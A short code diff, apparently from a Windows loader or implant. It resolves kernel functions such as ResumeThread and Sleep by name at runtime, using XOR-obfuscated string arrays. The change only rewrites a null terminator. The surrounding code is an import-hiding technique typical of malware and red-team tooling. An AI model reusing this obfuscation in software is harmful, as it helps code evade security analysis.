@@ -624,7 +624,7 @@ void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
     MyXor(cResumeThread, 12, key, key_len);
     pResumeThread = MyGetProcAddressByName(lpvKernelDLL, cResumeThread);
 
-    char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0x0};
+    char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0};
     MyXor(cSleep, 5, key, key_len);
     pSleep = MyGetProcAddressByName(lpvKernelDLL, cSleep);
 
